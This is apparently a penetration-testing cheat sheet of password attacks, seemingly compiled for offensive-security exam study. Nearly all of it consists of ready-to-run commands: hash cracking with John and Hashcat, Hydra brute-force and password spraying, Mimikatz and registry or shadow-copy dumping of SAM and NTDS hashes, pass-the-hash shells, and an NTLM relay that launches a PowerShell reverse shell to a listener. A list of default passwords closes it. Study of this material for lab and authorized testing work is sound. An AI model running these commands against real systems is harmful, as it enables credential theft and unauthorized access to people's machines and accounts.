
| [[05 Password Pwning#Hash Analyzer\|Hash Analyzer]]                           | [[05 Password Pwning#JohnTheRipper\|JohnTheRipper]]                 | [[05 Password Pwning#Hashcat\|Hashcat]]                           | [[05 Password Pwning#Hydra\|Hydra]]                                       |
| -------------------------------------------------------------------------- | ---------------------------------------------------------------- | -------------------------------------------------------------- | ---------------------------------------------------------------------- |
| [[05 Password Pwning#Password Manager (KeePass)\|Password Manager (KeePass)]] | [[05 Password Pwning#NTLM\|NTLM]]                                   | [[05 Password Pwning#Net-NTLMv2\|Net-NTLMv2]]                     | [[05 Password Pwning#Windows Credential Guard\|Windows Credential Guard]] |
| [[05 Password Pwning#Manual Hash Dumping\|Manual Hash Dumping]]               | [[05 Password Pwning#Pass-the-Hash Attacks\|Pass-the-Hash Attacks]] | [[05 Password Pwning#GPP-Stored Passwords\|GPP-Stored Passwords]] | [[05 Password Pwning#Side Notes\|Side Notes]]                             |
## Hash Analyzer
```shell
# Can just Google or use this:
https://www.tunnelsup.com/hash-analyzer/
```

## JohnTheRipper
```shell
# Converting encrypted files e.g. id_rsa file
kali@kali:~$ ssh2john id_rsa > hash

# Crack with john
kali@kali:~$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 

# Create rule file and run
kali@kali:~$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash

# Example: ssh.rule
[List.Rules::sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
# EOF
```

## Hashcat
```shell
# Search for hash module number 
# https://hashcat.net/wiki/doku.php?id=example_hashes
kali@kali:~$ hashcat --help | grep -i "ntlm"

# Cracking hash with hashcat
kali@kali:~$ sudo hashcat -m <mode> hash /usr/share/wordlists/rockyou.txt -r <.rule file> --force

### Common hash modes:
# MD5 = 0
# BCrypt (Unix) = 3200
# KeePass = 13400
# id_rsa/SSH = 22921
# NTLM = 1000
# Net-NTLMv2 (Responder) = 5600
# Atlassian/Confluence = 12001
# AS-REP Roasting = 18200
# Kerberoasting = 13100
```
## Hydra
```shell
# SSH Password Dictionary Attack
kali@kali:~$ hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt -s <PORT> ssh://<TARGET_IP>

# RDP Password Spraying
kali@kali:~$ hydra -L <USERNAME_LIST> -p "SuperS3cure1337#" rdp://<TARGET_IP>

# HTTP Dictionary Attack
kali@kali:~$ hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http(s)-{get/post}-form "/index.php:fm_usr=user&fm_pwd=^PASS^: Login failed. Invalid"
# use http-head for basic auth
# use http-get for digest auth without colon-delimited fields
# refer to sample response for username and password variable names
# last string is for failed login identifier/condition string
```
## Password Manager (KeePass)
```shell
# Find KeePass database file
PS C:\Users\offsec> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Find KeePass DB file in Linux
kali@kali:~$ find / -name *.kdbx 2>/dev/null

# Format db file to hash and crack
kali@kali:~$ keepass2john Database.kdbx > keepass.hash # Remove username if have
kali@kali:~$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## NTLM
```powershell
# Run Mimikatz (as Admin preferably)
PS C:\Users\offsec> .\mimikatz.exe

# Standard elevation 
mimikatz> token::elevate
mimikatz> privilege::debug

# Extract NTLM hashes from SAM
mimikatz> lsadump::sam

# Extract plaintext password/hashes from all sources
mimikatz> sekurlsa::logonpasswords

# Run hashcat against hashes
kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
## Net-NTLMv2
```powershell
# Check interfaces and run Responder with desired interface
kali@kali:~$ ip a
kali@kali:~$ sudo respnder -I <INTERFACE>

# Send a request to responder SMB from target PC
C:\Windows\system32> dir \\<KALI_IP>\test

# Crack hash shown in responder tab
kali@kali:~$ sudo hashcat -m 5600 resp.hash /usr/share/wordlists/rockyou.txt
```
## Windows Credential Guard
```powershell
# Check if CredentialGuard is running
PS C:\Users\offsec> Get-ComputerInfo
# Look for DeviceGuardSecurityServicesConfigured

# Inject SSP and log plaintext passwords
mimikatz> privilege::debug
mimikatz> misc:memssp

# Check log file for passwords (for users that logged in)
PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
```
## Manual Hash Dumping
```powershell
# Dump hashes from registry
PS C:\Users\offsec> reg save HKLM\system SYSTEM
PS C:\Users\offsec> reg save HKLM\sam SAM

# Transfer to Kali then extract hashes
kali@kali:~$ impacket-secretsdump -sam SAM -system SYSTEM local
# Format: UID:RID:LMHash:NTHash

# With SeBackupPrivilege, can create shadow copy
kali@kali:~$ nano jackie.dsh # check common payloads for content
kali@kali:~$ unix2dos jackie.dsh
Evil-WinRM C:\Users\jackie> upload jackie.dsh
Evil-WinRM C:\Users\jackie> diskshadow /s jackie.dsh
Evil-WinRM C:\Users\jackie> robocopy /b z:\windows\ntds . ntds.dit
Evil-WinRM C:\Users\jackie> download ntds.dit

# Now extract hashes
kali@kali:~$ impacket-secretsdump -ntds ntds.dit -system SYSTEM local

# Crack the hashes or use for Pass-The-Hash attacks
# Backup Operators can dump SAM and SYSTEM registry !!
```

## Pass-the-Hash Attacks
```shell
# Access SMB with NTLM hash
kali@kali:~$ smbclient \\\\<TARGET_IP>\\share -U Administrator --pw-nt-hash <NTLM_hash>

# Get shell with NTLM hash
kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:<NTLM_hash> <USERNAME>@<IP> <COMMAND or blank for cmd.exe>
# 32 0's are placeholder, can use LM hash too

# Get shell with NTLM hash 2
kali@kali:~$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:<NTLM_hash> <DOMAIN/USER>@<IP>

# Getting reverse shell by relaying Net-NTLMv2
kali@kali:~$ impacket-ntlmrelayx -no-http-server -smb2support -t <TARGET_IP> -c "<pwsh reverse shell one-liner encoded>"
# Refer to https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
# Final output should be "powershell -enc xxx"
kali@kali:~$ nc -lvnp 4444 # setup reverse shell listener
C:\Users\offsec> dir \\<KALI_IP>\test # system1 requests smb connection to kali for relay

# Pass-the-Hash with Evil-WinRM
kali@kali:~$ evil-winrm -i <TARGET_IP> -u Administrator -H <NT_Hash)
```
## GPP-Stored Passwords
```shell
# Decrypt Group Policy Preferences-Stored passwords (found in shares\sysvol)
kali@kali:~$ gpp-decrypt "<HASH>"
```
## Side Notes
- Have a valid username first
- Try various basic shit first e.g.:
	- admin:admin
	- username:username
- If service-related, try default passwords (Google)
	- E.g. service name is the username, same name for password
- ALL PASSWORDS IN ROCKYOU.TXT (and maybe additional rule file ?)
- Some default passwords to try:
	- password
	- password1
	- Password1
	- Password@123
	- password@123
	- admin
	- administrator
	- admin@123
	- secret